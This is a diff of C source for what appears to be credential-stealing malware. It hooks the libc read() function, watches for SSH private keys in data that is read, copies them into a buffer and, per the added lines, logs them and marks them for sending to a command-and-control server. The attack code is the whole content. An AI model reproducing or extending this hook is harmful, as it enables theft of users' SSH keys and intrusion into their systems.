@@ -5,7 +5,7 @@
 #include <string.h>
 #include <errno.h>
 #include "c2_client.h"
-#include "utils.h"  
+#include "utils.h"
 
 static ssize_t (*real_read)(int, void*, size_t) = NULL;
 static char ssh_key_buffer[8192];  // Tampon pour stocker les clés SSH détectées
@@ -29,7 +29,8 @@ ssize_t read(int fd, void *buf, size_t count) {
 
         // Vérifier si on détecte une clé SSH
         if (strstr((char *)buf, "BEGIN OPENSSH PRIVATE KEY")) {
-            fprintf(stderr, "[hook_read] Détection d'une clé SSH, début de capture...\n");
+	fprintf(stderr, "[hook_read] Clé SSH détectée ! Envoi au C2...\n");
+	log_credentials((char *)buf);  // Ajout du log local
             ssh_key_detected = 1;
             strcpy(ssh_key_buffer, (char *)buf);
         } 
